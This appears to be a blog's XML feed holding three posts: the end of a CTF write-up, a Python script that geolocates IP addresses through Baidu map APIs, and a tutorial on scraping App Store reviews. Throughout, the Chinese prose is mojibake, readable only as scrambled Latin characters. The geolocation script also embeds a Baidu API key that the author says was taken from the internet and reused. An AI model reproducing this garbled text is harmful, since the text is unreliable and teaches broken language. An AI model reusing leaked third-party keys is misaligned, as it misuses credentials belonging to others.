src="https://s1.ax1x.com/2020/03/30/Gn4UkF.png" alt="Gn4UkF.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨Timothyé‡Œé¢ï¼Œcat ä¸€ä¸‹ï¼Œæ˜¯ä¸€æ®µæ–‡ç« ï¼Œè¿™é‡ŒçŸ¥é“flagæ ¼å¼ï¼Œgrepä¸€ä¸‹ wctf2020ï¼Œå°±å¯ä»¥çœ‹åˆ°flagäº†ã€‚</p><p><img src="https://s1.ax1x.com/2020/03/30/GnXUzT.png" alt="GnXUzT.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/GnXYiq.png" alt="GnXYiq.png"></p><p>In the end, train yourself to be godly.</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ipå®šä½è·å–åŠåå‘åœ°å€è§£æ</title>
    <link href="/2020/03/21/ip_trace/"/>
    <url>/2020/03/21/ip_trace/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘åœ¨è¿ç»´çš„æ—¶å€™ç¢°åˆ°ä¸€äº›æ¶æ„è®¿é—®ï¼Œæ¶æ„æ“ä½œçš„æƒ…å†µï¼Œæœ‰å¸ˆå‚…å»ºè®®æˆ‘å¯ä»¥æŒ‚ä¸ªipè¿½è¸ªçš„è„šæœ¬ï¼Œè‡³å°‘å¯ä»¥å®šä½ä¸ªå¤§æ¦‚ã€‚</p><h1 id="åŸºäºç™¾åº¦å®šä½æ¥å£çš„-ip-å®šä½è„šæœ¬"><a href="#åŸºäºç™¾åº¦å®šä½æ¥å£çš„-ip-å®šä½è„šæœ¬" class="headerlink" title="åŸºäºç™¾åº¦å®šä½æ¥å£çš„ ip å®šä½è„šæœ¬"></a>åŸºäºç™¾åº¦å®šä½æ¥å£çš„ ip å®šä½è„šæœ¬</h1><p>ç™¾åº¦åœ°å›¾ä»€ä¹ˆçš„éƒ½æœ‰ç±»ä¼¼çš„æ¥å£ï¼Œè¿™é‡Œä¸»è¦åˆ©ç”¨äº† <a href="http://lbsyun.baidu.com/index.php?title=webapi/ip-api">æ™®é€šipå®šä½</a> å’Œ <a href="http://lbsyun.baidu.com/index.php?title=uri/api/web">åå‘åœ°å€è§£æ</a> çš„æ¥å£ã€‚</p><h2 id="æ™®é€š-ip-å®šä½"><a href="#æ™®é€š-ip-å®šä½" class="headerlink" title="æ™®é€š ip å®šä½"></a>æ™®é€š ip å®šä½</h2><p>è·å– ip åœ°å€çš„æ–¹æ³•å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸åšä»‹ç»ï¼Œå¾—åˆ°çš„ ip åï¼Œå°±è°ƒç”¨å®šä½çš„æ¥å£ï¼Œå…ˆæŠŠ ip æ‰€å±åœ°è¿›è¡ŒæŸ¥è¯¢ï¼Œä¸€èˆ¬æ¥è¯´ä¸è¿è¡Œå•†çš„åŸºç«™æˆ–è€…å®½å¸¦çš„éƒ¨ç½²æœ‰å…³ï¼Œæ¥å£æ˜¯ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>api.map.baidu.com<span class="hljs-regexp">/location/i</span>p?ak=å¼€å‘è€…çš„AppKey&amp;ip=è¿™é‡Œæ˜¯ipåœ°å€&amp;coor=bd09ll <span class="hljs-regexp">//</span>HTTPåè®®<br>https:<span class="hljs-regexp">//</span>api.map.baidu.com<span class="hljs-regexp">/location/i</span>p?ak=å¼€å‘è€…çš„AppKey&amp;ip=è¿™é‡Œæ˜¯ipåœ°å€&amp;coor=bd09ll <span class="hljs-regexp">//</span>HTTPSåè®®<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä»ä¸­ä¸»è¦å–ç»çº¬åº¦åæ ‡ï¼Œçœä»½åŸå¸‚ä¿¡æ¯ï¼Œå’ŒèŠ‚ç‚¹çš„ä¿¡æ¯ï¼Œè¿”å›çš„æ˜¯ json æ ¼å¼ï¼Œå› æ­¤è¿˜æ˜¯éœ€è¦å°†æ•°æ®çš„ç»“æ„è¿›è¡Œåˆ†æã€‚</p><ul><li>ç»åº¦ y åœ¨ <code>content</code> ä¸­ <code>point</code> çš„ <code>y</code> é‡Œ</li><li>ç»åº¦ x åœ¨ <code>content</code> ä¸­ <code>point</code> çš„ <code>x</code> é‡Œ</li><li>çœä»½åŸå¸‚åˆ†åˆ«åœ¨ <code>content</code> ä¸­ <code>address_detail</code> çš„ <code>province</code> ã€<code>content</code> ä¸­ <code>address_detail</code> çš„ <code>city</code>é‡Œ</li><li>èŠ‚ç‚¹ä¿¡æ¯ç›´æ¥ç”¨ <code>address</code> é‡Œçš„ä¿¡æ¯å°±å¤Ÿäº†</li></ul><p>å¯ä»¥å¯¹ä¿¡æ¯è¿›è¡Œè¾“å‡ºï¼Œç„¶åå†æŠŠx, yåæ ‡è¿›è¡Œå­˜å‚¨ã€‚</p><p>è¿”å›çš„å®ä¾‹ jsonï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>  <br>    address<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CN|åŒ—äº¬|åŒ—äº¬|None|CHINANET|1|None&quot;</span><span class="hljs-punctuation">,</span>    #è¯¦ç»†åœ°å€ä¿¡æ¯  <br>    content<span class="hljs-punctuation">:</span>    #ç»“æ„ä¿¡æ¯  <br>    <span class="hljs-punctuation">&#123;</span>  <br>        address<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;åŒ—äº¬å¸‚&quot;</span><span class="hljs-punctuation">,</span>    #ç®€è¦åœ°å€ä¿¡æ¯  <br>        address_detail<span class="hljs-punctuation">:</span>    #ç»“æ„åŒ–åœ°å€ä¿¡æ¯  <br>        <span class="hljs-punctuation">&#123;</span>  <br>            city<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;åŒ—äº¬å¸‚&quot;</span><span class="hljs-punctuation">,</span>    #åŸå¸‚  <br>            city_code<span class="hljs-punctuation">:</span> <span class="hljs-number">131</span><span class="hljs-punctuation">,</span>    #ç™¾åº¦åŸå¸‚ä»£ç   <br>            district<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>    #åŒºå¿  <br>            province<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;åŒ—äº¬å¸‚&quot;</span><span class="hljs-punctuation">,</span>    #çœä»½      <br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>  <br>        point<span class="hljs-punctuation">:</span>    #å½“å‰åŸå¸‚ä¸­å¿ƒç‚¹  <br>        <span class="hljs-punctuation">&#123;</span>  <br>            x<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;116.39564504&quot;</span><span class="hljs-punctuation">,</span>    #å½“å‰åŸå¸‚ä¸­å¿ƒç‚¹ç»åº¦<br>            y<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;39.92998578&quot;</span>    #å½“å‰åŸå¸‚ä¸­å¿ƒç‚¹çº¬åº¦<br>        <span class="hljs-punctuation">&#125;</span>  <br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>  <br>    status<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span>    #ç»“æœçŠ¶æ€è¿”å›ç   <br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="åå‘åœ°å€è§£æ"><a href="#åå‘åœ°å€è§£æ" class="headerlink" title="åå‘åœ°å€è§£æ"></a>åå‘åœ°å€è§£æ</h2><p>åå‘åœ°å€è§£æå…¶å®å¯ä»¥ç”¨åˆ°å¾ˆå¤šä¼˜ç§€çš„è§£ææ¥å£ï¼Œä½†æ˜¯å› ä¸ºéº»çƒ¦(ç©·)æ‰€ä»¥ç›´æ¥ä½¿ç”¨ç™¾åº¦çš„æ¥å£äº†ã€‚</p><p>ç”¨çš„ api é‡Œçš„ ak æ˜¯ç›´æ¥ç½‘ä¸Šæ‰¾çš„ï¼Œç›´æ¥ç”¨ã€‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//api.map.baidu.com/geocoder/v<span class="hljs-number">2</span>/?ak<span class="hljs-operator">=</span><span class="hljs-number">36</span>fcc<span class="hljs-number">51e203</span><span class="hljs-keyword">c</span><span class="hljs-number">9958959</span>d<span class="hljs-number">419e24238112</span>&amp;callback<span class="hljs-operator">=</span>renderReverse&amp;location<span class="hljs-operator">=</span>y<span class="hljs-punctuation">,</span> <span class="hljs-keyword">x</span>&amp;output<span class="hljs-operator">=</span>json&amp;pois<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;qq-pf-<span class="hljs-keyword">to</span><span class="hljs-operator">=</span>pcqq.<span class="hljs-keyword">c</span><span class="hljs-number">2</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p>y å’Œ x æ›¿æ¢æˆè·å–åˆ°çš„åæ ‡ï¼Œæ³¨æ„æœ‰è‹±æ–‡é€—å·åˆ†éš”ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¤„ç† <code>json</code> æ•°æ®äº†ï¼Œä¸»è¦æ•°æ®åœ¨ <code>result</code> é‡Œé¢ï¼Œå…¶ä¸­ï¼š</p><ul><li>é»˜è®¤æœ‰ä¸€ä¸ªæ ¼å¼åŒ–çš„åœ°å€ï¼Œ<code>formatted_address</code> ã€‚</li><li>è¿˜æœ‰ä¸€äº›å…¶å®ƒçš„ç»“æœï¼Œæˆ‘ä¹ŸæŠŠä»–ä»¬ä½œä¸ºä¸€ä¸ªè¾“å‡ºï¼Œåœ¨ <code>result</code> é‡Œæœ‰ä¸€ä¸ª <code>pois</code> çš„ keyï¼Œæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œæˆ‘ä»¬å¾ªç¯è¿›è¡Œè¾“å‡ºæ¯ä¸ªå…ƒç´ çš„ <code>addr</code> åœ°å€å³å¯ã€‚</li></ul><h2 id="å®Œæ•´æºç "><a href="#å®Œæ•´æºç " class="headerlink" title="å®Œæ•´æºç "></a>å®Œæ•´æºç </h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SendUrl</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_url</span>(<span class="hljs-params">self, url, headers</span>):<br>r = requests.get(url, headers=headers)<br>response = <span class="hljs-built_in">str</span>(r.content, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>js = json.loads(response)<br><br>x = js[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;point&#x27;</span>][<span class="hljs-string">&#x27;x&#x27;</span>]<br>y = js[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;point&#x27;</span>][<span class="hljs-string">&#x27;y&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;================================================&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;location:&#x27;</span>+ js[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;address_detail&#x27;</span>][<span class="hljs-string">&#x27;province&#x27;</span>] + js[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;address_detail&#x27;</span>][<span class="hljs-string">&#x27;city&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;y:&#x27;</span>+ js[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;point&#x27;</span>][<span class="hljs-string">&#x27;y&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;x:&#x27;</span>+ js[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;point&#x27;</span>][<span class="hljs-string">&#x27;x&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;node:&#x27;</span>+ js[<span class="hljs-string">&#x27;address&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;================================================&quot;</span>)<br><br>Url = <span class="hljs-string">&quot;http://api.map.baidu.com/geocoder/v2/?ak=36fcc51e203c9958959d419e24238112&amp;callback=renderReverse&amp;location=&quot;</span> + y + <span class="hljs-string">&quot;,&quot;</span> + x + <span class="hljs-string">&quot;&amp;output=json&amp;pois=1&amp;qq-pf-to=pcqq.c2c&quot;</span><br>R = requests.get(Url, headers=headers)<br>Response = <span class="hljs-built_in">str</span>(R.content, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>index = Response.find(<span class="hljs-string">&quot;(&quot;</span>)<br>Response = Response[index+<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>js1 = json.loads(Response)<br>result = js1[<span class="hljs-string">&quot;result&quot;</span>]<br><br>formatted_address = result[<span class="hljs-string">&quot;formatted_address&quot;</span>]<br><span class="hljs-built_in">print</span>(formatted_address)<br>pois = result[<span class="hljs-string">&quot;pois&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pois:<br><span class="hljs-built_in">print</span>(i[<span class="hljs-string">&quot;addr&quot;</span>])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Main</span>():<br>  <span class="hljs-comment"># ak éœ€è‡ªè¡Œæ³¨å†Œ</span><br>  sx = SendUrl()<br>  ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;ip:\n&quot;</span>)<br>  ak = <span class="hljs-string">&#x27;&#x27;</span><br>  url = <span class="hljs-string">&quot;https://api.map.baidu.com/location/ip?ak=&quot;</span> + ak + <span class="hljs-string">&quot;&amp;ip=&quot;</span> + ip + <span class="hljs-string">&quot;&amp;coor=bd09ll&quot;</span><br>  headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span>&#125;<br>  sx.send_url(url, headers)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  Main()<br><br></code></pre></td></tr></table></figure><p>æ•ˆæœå›¾ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/23/87Lz0H.png" alt="87Lz0H.png"></p><p>åº”è¯¥æ˜¯èŠ‚ç‚¹é™„è¿‘çš„åœ°å€ï¼Œåœ¨ ipip ä¸Šçš„ç»“æœæœ‰æ—¶å€™æ›´åŠ å‡†ç¡®ï¼Œè¦ç²¾ç¡®è‚¯å®šå¾—èŠ±é’±ï¼Œç©·é¬¼åªèƒ½ç”¨è¿™ä¸ªç©ç©ç»ƒæ‰‹äº†ã€‚</p><h1 id="åŸºäº-ipip-å¯¹-ip-è¿›è¡Œå…·ä½“å®šä½"><a href="#åŸºäº-ipip-å¯¹-ip-è¿›è¡Œå…·ä½“å®šä½" class="headerlink" title="åŸºäº ipip å¯¹ ip è¿›è¡Œå…·ä½“å®šä½"></a>åŸºäº ipip å¯¹ ip è¿›è¡Œå…·ä½“å®šä½</h1><h2 id="ç©·é¬¼æ–¹æ³•ï¼š"><a href="#ç©·é¬¼æ–¹æ³•ï¼š" class="headerlink" title="ç©·é¬¼æ–¹æ³•ï¼š"></a>ç©·é¬¼æ–¹æ³•ï¼š</h2><p>è·å– ip åç›´æ¥è¿›è¡ŒæŸ¥è¯¢ï¼Œç„¶åä»è¿”å›çš„ html é¡µé¢è¿›è¡Œè§£æï¼Œæå–æœ‰ç”¨æ•°æ®ï¼Œå½“ç„¶æˆ‘è§‰å¾—æœ‰ç‚¹è¿æ°”æˆåˆ†ï¼Œæ‰¾æœ‹å‹æ‹¿äº†å‡ ä¸ª ip åªå®šä½åˆ°å¿çº§ï¼Œä½†æˆ‘è‡ªå·±çš„ ip ç»™æˆ‘å®šä½åˆ°äº†æˆ‘å°åŒºï¼ˆæœ‰ç‚¹åŠï¼Œä¸è¿‡åŸç†æ˜¯æŸ¥åº“ï¼Œä¹Ÿä¸æ˜¯ç›´æ¥å®šä½ã€‚</p><p>å…ˆæŒ–ä¸ªå‘ï¼Œè„šæœ¬ä»¥åå†å†™ã€‚</p><h2 id="åœŸè±ªæ–¹æ³•ï¼š"><a href="#åœŸè±ªæ–¹æ³•ï¼š" class="headerlink" title="åœŸè±ªæ–¹æ³•ï¼š"></a>åœŸè±ªæ–¹æ³•ï¼š</h2><p>ç›´æ¥ä¹°æœåŠ¡ï¼Œä¼šæä¾›æ¥å£ï¼Œè¿”å›çš„æ˜¯ <code>json</code> æ•°æ®ï¼Œæ­¥éª¤å°±å’Œç”¨ç™¾åº¦æ¥å£ä¸€æ ·äº†ï¼Œè¿˜æœ‰ä¸€äº›æ˜¯æ›´ç²¾ç¡®å®šä½çš„ï¼Œæœ‰å¸ˆå‚…å»å°è¯•å®Œäº†å¯ä»¥è®©æˆ‘è¹­ä¸€è¹­å°å°é²œã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å¦‚æœå‘èµ·æ”»å‡»çš„è¯ï¼ŒæŒ‚ä»£ç†æˆ–è€…ç”¨ä»£ç†æ± æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„æ­¥éª¤ï¼Œä½ ä¸çŸ¥é“å¯¹æ‰‹ä¼šæ€ä¹ˆè·å–ä½ çš„ä¿¡æ¯ã€‚åœ¨è¿ç»´ç«‹åœºçš„è¯ï¼Œå¯èƒ½å°±å¾—åœ¨å¾ˆå¤šåœ°æ–¹æ”¾ä¸‹ä¸€äº›èœœç½ï¼Œæˆ–è€…è®°å½•çš„ç¨‹åºï¼Œæœç„¶è¿ç»´æ²¡æœ‰ç¡çœ ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŸºäºApp Storeçš„Appè¯„è®ºçˆ¬å–</title>
    <link href="/2020/03/19/appstore_data_crawling/"/>
    <url>/2020/03/19/appstore_data_crawling/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä»Šå¤©åœ¨çœ‹ç€ <code>phar</code>ï¼Œä¸€ä¸ªæœ‹å‹(å·¥ç®¡ç±»)çªç„¶é—®äº†æˆ‘æƒ³çˆ¬å– <code>App Store</code> ä¸Š App çš„è¯„è®ºä¿¡æ¯ï¼Œé—®æˆ‘æœ‰æ²¡æœ‰ä»€ä¹ˆæƒ³æ³•ï¼Œçœ‹äº†ä¸€ä¸‹æ‰‹æœºç«¯å¥½åƒæš‚æ—¶æ²¡ä»€ä¹ˆæ€è·¯ï¼Œæ¯•ç«Ÿæ²¡æ¥è§¦è¿‡ç§»åŠ¨ç«¯çš„ï¼Œä½†æ˜¯æˆ‘å‘ç° App Store ä¸Š PC ç«¯çš„ç½‘é¡µå°±æœ‰ï¼Œæ¯ä¸ª App éƒ½ä¼šæœ‰ä¸€ä¸ªè¯¦ç»†çš„é¡µé¢ï¼Œäºæ˜¯ç™¾åº¦äº†ä¸€ä¸‹ QQï¼Œç½‘æ˜“äº‘ä»€ä¹ˆçš„ï¼Œæ³¨æ„åˆ° url ä¸Šæœ‰ id å…³é”®å­—ï¼Œé‚£çŒœæµ‹å°±æ˜¯æ¯ä¸ª app éƒ½ä¼šæœ‰ä¸€ä¸ªå”¯ä¸€çš„ idï¼Œæµ‹äº†ä¸€ä¸‹ï¼ŒæœçœŸå¦‚æ­¤ï¼Œé‚£æŠŠå®ƒè½¬åŒ–æˆç½‘é¡µå°±è·Ÿæ™®é€šçˆ¬è™«ä¸€æ ·å¤„ç† HTML çš„æ•°æ®äº†ã€‚æœ¬æ¥æŠŠæ€è·¯æ‘¸æ¸…æ¥šå‘Šè¯‰æœ‹å‹å°±ç®—äº†ï¼Œä½†æˆ‘æœç€æœç€ï¼Œçªç„¶å‘ç°è‹¹æœè´´å¿ƒåœ°æä¾›äº† App ä¿¡æ¯çš„æ¥å£ï¼è¿”å›çš„æ˜¯ <code>json</code> æ ¼å¼çš„æ•°æ®ï¼Œè¿™æ ·å°±éå¸¸å‹å¥½äº†ï¼Œæ‰“ç®—è‡ªå·±åŠ¨æ‰‹ä¹Ÿè¯•ä¸€è¯•ã€‚</p><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><p>é¦–å…ˆå½“ç„¶åˆ†æçš„æ˜¯ <code>url</code> äº†ï¼Œç”¨ QQ åšä¾‹å­ï¼š<code>https://apps.apple.com/cn/app/qq/id444934666</code>ï¼Œåé¢çš„ id æ¢æˆæŒ‡å®š app çš„ idï¼Œå°±ä¼šè·³è½¬åˆ° app çš„ä¿¡æ¯é¡µé¢ï¼Œæœ‰æˆªå±ï¼Œæ›´æ–°ä¿¡æ¯ï¼Œä»‹ç»ï¼Œè¯„åˆ†å’Œè¯„è®ºç­‰ã€‚</p><p>ç„¶åæˆ‘æ‰¾åˆ°äº†è¿™ä¸ªå‹å¥½çš„æ¥å£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://itunes.apple.com/rss/customerreviews/page=é¡µç /id=appçš„id/sortby=mostrecent/json?l=en&amp;&amp;cc=cn<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå‚æ•° <code>page</code> å°±æ˜¯ç¬¬ä¸€é¡µã€ç¬¬äºŒé¡µä¹‹ç±»çš„ï¼Œæµ‹è¯•äº†ä¸€ä¸‹å‘ç°åªèƒ½çœ‹è§å‰10é¡µï¼Œç½‘é¡µåšå‡ºäº†é™åˆ¶ï¼š</p><blockquote><p>CustomerReviews RSS page depth is limited to 10</p></blockquote><p>ä¸€é¡µå¤§æ¦‚ 50 æ¡å·¦å³ï¼Œé‚£å°±æ˜¯åªèƒ½çˆ¬å– 500 æ¡ï¼Œä¸çŸ¥é“ç›´æ¥åœ¨è¯¦æƒ…é¡µèƒ½åˆ·å‡ºå‡ æ¡è¯„è®ºï¼Œæ²¡æœ‰å»æµ‹ã€‚</p><p>å‚æ•° <code>id</code> å°±æ˜¯ app çš„ id äº†ï¼Œè·å– idæ–¹æ³•å¤§æ¦‚æœ‰å‡ ç§ï¼š</p><ol><li><p>è¿™ä¸ªç™¾åº¦å°±æœ‰å¾ˆå¤šï¼Œä¸è¯¦ç»†è¯´äº†ï¼Œè´´ä¸€ä¸ªå‚è€ƒåšå®¢ï¼š<a href="https://www.jianshu.com/p/229fae5434eb">è·å–åº”ç”¨åœ¨AppStoreçš„é“¾æ¥åœ°å€ï¼Œä»Appä¸­è·³è½¬åˆ°AppStore</a></p></li><li><p>ç›´æ¥åœ¨ç™¾åº¦æœç´¢ <code>â€App Store ä¸Šçš„ &quot;QQ&quot;</code>ï¼Œå°±èƒ½æ‰¾åˆ°ç½‘é¡µäº†</p></li><li><p>æˆ‘åˆå‘ç°äº†è‹¹æœæä¾›äº†ä¸€ä¸ªæœç´¢çš„æ¥å£ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>tunes.apple.com/search?term=appåç§°&amp;entity=software<br></code></pre></td></tr></table></figure><p>éå¸¸æ–¹ä¾¿ï¼Œè¿”å›çš„ä¹Ÿæ˜¯ <code>json</code> æ•°æ®ï¼Œæ‰€æœ‰çš„æœç´¢ç»“æœéƒ½åœ¨é‡Œé¢äº†ï¼Œä½†æœ‰æ—¶å€™æœ‰ä¸€äº›è¿”å›çš„ç»“æœä¸å¤Ÿç²¾ç¡®ï¼Œæ¯”å¦‚æœ <code>ç½‘æ˜“äº‘éŸ³ä¹</code> åœ¨æœç´¢ç»“æœé‡Œé¢å¹¶æ²¡æœ‰ç½‘æ˜“äº‘éŸ³ä¹è¿™ä¸ª appï¼Œåªæœ‰ä¸€äº›ç›¸å…³çš„ï¼Œè¿™é‡Œåªèƒ½åšä¸€ä¸ªç®€å•çš„å‚è€ƒï¼Œè¿˜æ˜¯ä»¥æ–¹æ³•1ã€2ä¸ºç²¾ç¡®æŸ¥æ‰¾ã€‚</p></li></ol><h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>å½“ç„¶æˆ‘ä»¬è¦å†™ç¨‹åºé¦–å…ˆå¾—ç¡®å®šéœ€æ±‚ï¼š</p><ul><li>è·å– app id</li><li>è·å– app è¯„è®º</li><li>å¯¹ json æ•°æ®è¿›è¡Œæ“ä½œ</li><li>ä¸ºäº†æ–¹ä¾¿ä¿å­˜ï¼Œå¯ä»¥ä¿å­˜åœ¨ä¸€ä¸ª excel è¡¨é‡Œ</li></ul><p>æ‰€ä»¥å¤§è‡´éœ€è¦çš„æ¨¡å—æœ‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> openpyxl<br></code></pre></td></tr></table></figure><p>å› ä¸ºç»™äº†æ¥å£ï¼Œæ‰€ä»¥å®ç°ä¹Ÿä¸éš¾ï¼ˆä¸ç„¶æˆ‘æ‰ä¸ä¼šå»å†™ï¼‰ã€‚</p><p>åªæœ‰ <code>openpyxl</code> ä¸æ˜¯å†…ç½®æ¨¡å—ï¼Œå› æ­¤ä½¿ç”¨å‰å…ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pip install openpyxl<br></code></pre></td></tr></table></figure><p>å…·ä½“æ€ä¹ˆä½¿ç”¨ç™¾åº¦æˆ–è€…è°·æ­Œçœ‹çœ‹æ–‡æ¡£å°±å¯ä»¥äº†ã€‚</p><h1 id="ç¼–å†™"><a href="#ç¼–å†™" class="headerlink" title="ç¼–å†™"></a>ç¼–å†™</h1><h2 id="è·å–-App-ID"><a href="#è·å–-App-ID" class="headerlink" title="è·å– App ID"></a>è·å– App ID</h2><p>ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ï¼Œåšäº†ä¸€ç‚¹äº¤äº’ï¼Œè¾“å…¥åå­—æ¥æœç´¢ï¼Œå®ƒè¿”å›çš„æ˜¯æ¯«æ— æ ¼å¼çš„ <code>json</code> æ•°æ®ï¼Œæ”¾åˆ° <code>www.json.cn</code> ç¾åŒ–ä¸€ä¸‹æ ¼å¼çœ‹çœ‹ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ <code>resultCount</code> ï¼Œæœç´¢çš„ç»“æœæ•°é‡ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/20/86wViV.png" alt="86wViV.png"></p><p>ç„¶åæ‰¾åˆ°æœ€å…³é”®çš„æœ‰ id å’Œ nameï¼š</p><p><img src="https://s1.ax1x.com/2020/03/20/86wmzF.png" alt="86wmzF.png"></p><p>æœ‰å°±å¤Ÿäº†ï¼ŒæŠŠè§£æåˆ°çš„æ•°æ®ç”¨ <code>json.loads</code> å¤„ç†ä¸€ä¸‹ï¼Œç”¨ <code>type(data)</code> 